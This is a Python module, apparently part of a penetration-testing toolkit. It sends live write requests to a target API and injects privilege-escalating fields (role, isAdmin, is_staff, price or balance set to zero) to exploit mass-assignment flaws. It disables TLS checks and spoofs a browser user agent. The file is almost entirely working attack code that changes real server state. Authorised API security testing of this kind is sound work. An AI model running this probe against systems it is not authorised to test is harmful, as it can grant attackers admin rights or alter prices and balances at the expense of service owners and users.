"""
Execution logic for mass_assignment_probe: sends one real write per
candidate privilege-escalating field not already present in the
operator-supplied baseline body (OWASP API3, Broken Object Property
Level Authorization). Each call is a genuine write against live state --
hard-capped at MAX_FIELDS fields/requests per call. No parsing here --
that's parse.py's job.
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Dict, List, Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

DEFAULT_TIMEOUT = 10
MAX_FIELDS = 8

DEFAULT_CANDIDATE_FIELDS = (
    "role", "isAdmin", "is_admin", "admin", "privilege",
    "plan", "price", "balance", "verified", "is_staff",
)

# Escalation value chosen per field name: boolean-shaped fields get True,
# everything else gets a string that reads as a privileged role/tier.
_BOOLEAN_FIELD_MARKERS = ("is", "admin", "verified", "staff", "active", "enabled")


def _escalated_value(field_name: str):
    lower = field_name.lower()
    if any(marker in lower for marker in _BOOLEAN_FIELD_MARKERS):
        return True
    if lower in ("price", "balance"):
        return 0
    return "admin"


@dataclass
class RawMassAssignmentAttempt:
    field: str
    injected_value: object
    status_code: int = 0
    body: str = ""
    error: Optional[str] = None


@dataclass
class RawMassAssignmentResult:
    target: str = ""
    method: str = ""
    baseline_body: Dict = field(default_factory=dict)
    attempts: List[RawMassAssignmentAttempt] = field(default_factory=list)
    error: Optional[str] = None


def parse_custom_headers(headers_str: Optional[str]) -> Dict[str, str]:
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0",
        "Content-Type": "application/json",
    }
    if headers_str:
        for line in headers_str.splitlines():
            line = line.strip()
            if not line or ":" not in line:
                continue
            k, _, v = line.partition(":")
            headers[k.strip()] = v.strip()
    return headers


def execute(
    target: str,
    body: str,
    method: str = "POST",
    candidate_fields: Optional[str] = None,
    headers: Optional[str] = None,
    timeout: int = DEFAULT_TIMEOUT,
) -> RawMassAssignmentResult:
    if requests is None:
        return RawMassAssignmentResult(target=target, error="requests library not available")

    try:
        baseline_body = json.loads(body) if body else {}
        if not isinstance(baseline_body, dict):
            raise ValueError("body must decode to a JSON object")
    except Exception as exc:
        return RawMassAssignmentResult(target=target, error=f"invalid baseline 'body' JSON: {exc}")

    fields = [f.strip() for f in (candidate_fields or ",".join(DEFAULT_CANDIDATE_FIELDS)).split(",") if f.strip()]
    fields = [f for f in fields if f not in baseline_body][:MAX_FIELDS]

    req_headers = parse_custom_headers(headers)
    http_method = (method or "POST").upper()
    if http_method not in ("POST", "PUT", "PATCH"):
        return RawMassAssignmentResult(target=target, error=f"unsupported method '{method}' (use POST/PUT/PATCH)")

    attempts: List[RawMassAssignmentAttempt] = []
    for f in fields:
        injected = dict(baseline_body)
        value = _escalated_value(f)
        injected[f] = value
        try:
            resp = requests.request(
                http_method, target, json=injected, headers=req_headers,
                timeout=timeout, verify=False, allow_redirects=True,
            )
            attempts.append(RawMassAssignmentAttempt(
                field=f, injected_value=value, status_code=resp.status_code,
                body=(resp.text or "")[:5000],
            ))
        except requests.RequestException as exc:
            attempts.append(RawMassAssignmentAttempt(field=f, injected_value=value, error=str(exc)))
        except Exception as exc:
            attempts.append(RawMassAssignmentAttempt(field=f, injected_value=value, error=f"{type(exc).__name__}: {exc}"))

    return RawMassAssignmentResult(target=target, method=http_method, baseline_body=baseline_body, attempts=attempts)
